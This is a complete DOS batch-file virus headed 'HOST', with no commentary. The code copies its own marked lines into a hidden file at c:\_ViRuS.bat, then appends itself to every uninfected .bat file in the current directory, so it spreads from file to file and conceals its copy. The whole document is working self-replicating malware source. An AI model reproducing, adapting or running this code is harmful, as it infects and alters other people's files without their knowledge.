::**** HOST ****

@echo off%_ViRuS%
if '%1=='ViRuS goto ViRuS%2
set ViRuS=%0.bat
if not exist %ViRuS% set ViRuS=%0
if '%ViRuS%==' set ViRuS=autoexec.bat
if exist c:\_ViRuS.bat goto ViRuSg
if not exist %ViRuS% goto eViRuS
find "ViRuS"<%ViRuS%>c:\_ViRuS.bat
attrib c:\_ViRuS.bat +h
:ViRuSg
command /e:5000 /c c:\_ViRuS ViRuS v
:eViRuS
set ViRuS=
goto ViRuSe
:ViRuSv
for %%a in (*.bat) do call c:\_ViRuS ViRuS i %%a 
exit ViRuS
:ViRuSi
find "ViRuS"<%3>nul
if not errorlevel 1 goto ViRuSj
type %3>ViRuS$
echo.>>ViRuS$
type c:\_ViRuS.bat>>ViRuS$
move ViRuS$ %3>nul
exit ViRuS
:ViRuSj
set ViRuS!=%ViRuS!%-
if %ViRuS!%==-------------------- exit 
:ViRuSe
